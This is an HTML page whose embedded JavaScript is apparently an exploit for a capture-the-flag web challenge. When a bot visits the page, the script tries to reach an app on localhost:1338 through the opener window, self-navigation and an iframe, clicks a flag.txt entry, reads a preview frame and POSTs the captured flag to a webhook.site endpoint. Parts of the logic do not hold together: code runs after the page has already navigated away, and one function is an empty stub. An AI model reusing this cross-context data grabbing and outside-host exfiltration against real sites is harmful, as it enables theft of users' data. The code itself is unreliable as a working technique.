<!DOCTYPE html>
<html>
<head>
    <title>Flag Extractor - Working Version</title>
</head>
<body>
    <h1>Flag Extractor</h1>
    <div id="result">Bot visited! Extracting flag...</div>
    
    <script>
        function log(msg) {
            console.log(msg);
            const result = document.getElementById('result');
            result.innerHTML += `<p>${new Date().toISOString()}: ${msg}</p>`;
        }
        
        // The key insight: the bot opens localhost:1338 FIRST, then visits our page
        // We need to access the SAME browser context where the flag was added
        
        async function extractFlag() {
            log('Starting flag extraction...');
            
            try {
                // Method 1: Try to access the opener window (if it exists)
                if (window.opener) {
                    log('Found opener window, trying to access it...');
                    try {
                        if (window.opener.mathRandomInvocations) {
                            const salts = window.opener.mathRandomInvocations;
                            log(`Found salts in opener: ${JSON.stringify(salts)}`);
                            if (salts.length > 0) {
                                const flagSalt = salts[salts.length - 1];
                                await extractFlagWithSalt(flagSalt);
                                return;
                            }
                        }
                    } catch (e) {
                        log(`Opener access failed: ${e.message}`);
                    }
                }
                
                // Method 2: Try to access via window.open with specific target
                log('Trying to open localhost:1338 in same context...');
                const win = window.open('http://localhost:1338', '_self');
                
                // Wait for navigation
                setTimeout(() => {
                    // Check if we're now on the main app
                    if (window.location.hostname === 'localhost' && window.location.port === '1338') {
                        log('Successfully navigated to main app!');
                        
                        // Access the mathRandomInvocations array
                        if (window.mathRandomInvocations && window.mathRandomInvocations.length > 0) {
                            const flagSalt = window.mathRandomInvocations[window.mathRandomInvocations.length - 1];
                            log(`Found flag salt: ${flagSalt}`);
                            
                            // Find and click the flag file
                            const filesList = document.querySelector('#filesList');
                            if (filesList) {
                                const flagFile = Array.from(filesList.children).find(
                                    el => el.dataset.name === 'flag.txt'
                                );
                                
                                if (flagFile) {
                                    log('Found flag file, clicking it...');
                                    flagFile.click();
                                    
                                    // Wait for flag to load
                                    setTimeout(() => {
                                        const previewIframe = document.querySelector('#previewIframe');
                                        if (previewIframe) {
                                            // Try to access the flag content
                                            setTimeout(() => {
                                                try {
                                                    const flagContent = previewIframe.contentDocument.body.innerText;
                                                    if (flagContent && flagContent.includes('CTF{')) {
                                                        log(`ðŸš© FLAG FOUND: ${flagContent}`);
                                                        
                                                        // Send flag to external server (optional)
                                                        fetch('https://webhook.site/your-webhook-id', {
                                                            method: 'POST',
                                                            body: JSON.stringify({flag: flagContent}),
                                                            headers: {'Content-Type': 'application/json'}
                                                        }).catch(() => {});
                                                        
                                                        // Also display on page
                                                        document.body.innerHTML = `<h1 style="color: green;">FLAG: ${flagContent}</h1>`;
                                                    }
                                                } catch (e) {
                                                    log('Could not access SafeFrame content: ' + e.message);
                                                }
                                            }, 3000);
                                        }
                                    }, 2000);
                                }
                            }
                        }
                    }
                }, 2000);
                
            } catch (error) {
                log(`Exploit failed: ${error.message}`);
                
                // Method 3: Fallback - try iframe approach
                log('Trying iframe fallback...');
                const iframe = document.createElement('iframe');
                iframe.src = 'http://localhost:1338';
                iframe.style.width = '100%';
                iframe.style.height = '600px';
                document.body.appendChild(iframe);
                
                iframe.onload = () => {
                    log('Iframe loaded');
                    try {
                        const iframeWindow = iframe.contentWindow;
                        if (iframeWindow.mathRandomInvocations) {
                            const salts = iframeWindow.mathRandomInvocations;
                            log(`Found salts in iframe: ${JSON.stringify(salts)}`);
                        }
                    } catch (e) {
                        log(`Iframe access failed: ${e.message}`);
                    }
                };
            }
        }
        
        async function extractFlagWithSalt(salt) {
            log(`Extracting flag with salt: ${salt}`);
            // Implementation for SafeFrame extraction if needed
        }
        
        // Start extraction immediately
        extractFlag();
        
        // Also listen for any messages
        window.addEventListener('message', (event) => {
            log(`Received message: ${JSON.stringify(event.data)}`);
            if (event.data && typeof event.data === 'string' && event.data.includes('CTF{')) {
                log(`ðŸš© FLAG FOUND in message: ${event.data}`);
                document.getElementById('result').innerHTML = 
                    `<h2 style="color: green;">FLAG: ${event.data}</h2>`;
            }
        });
        
        log('Exploit initialized and running...');
    </script>
</body>
</html>
